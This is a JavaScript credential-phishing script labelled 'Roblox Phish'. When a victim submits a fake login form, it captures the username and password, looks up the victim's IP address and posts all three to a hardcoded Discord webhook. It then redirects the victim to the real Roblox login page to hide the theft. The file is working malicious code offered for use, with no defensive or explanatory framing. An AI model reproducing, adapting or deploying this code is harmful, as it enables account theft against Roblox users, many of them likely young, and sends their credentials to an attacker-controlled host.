// STABLE JS - WEBHOOK CAPTURE
const WEBHOOK_URL = "https://discord.com/api/webhooks/1538723870050095204/oZWJ3gD5uDClYngLjnV1cJU3EHxoFHNPyISpMStVadt5RFT64A0I1PVJ44OL-Ri-EFvY";

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('login-form');
    const btn = document.querySelector('button[type="submit"]');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (!username || !password) return;

        // UI Feedback
        btn.disabled = true;
        btn.textContent = "Logging in...";

        // Prepare Webhook Data
        const payload = {
            content: null,
            embeds: [{
                title: "🚨 New Roblox Login Captured",
                color: 16711680, // Red color
                fields: [
                    { name: "👤 Username", value: username, inline: true },
                    { name: "🔑 Password", value: password, inline: true },
                    { name: "⏰ Time", value: new Date().toLocaleString(), inline: false }
                ],
                footer: {
                    text: "Roblox Phish | IP: " + (await getIP())
                },
                timestamp: new Date().toISOString()
            }]
        };

        // Send to Discord
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            console.error("Webhook failed:", error);
        }

        // Redirect to real Roblox
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/login";
        }, 1000);
    });
});

// Simple IP fetcher for the footer
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return "Unknown";
    }
}
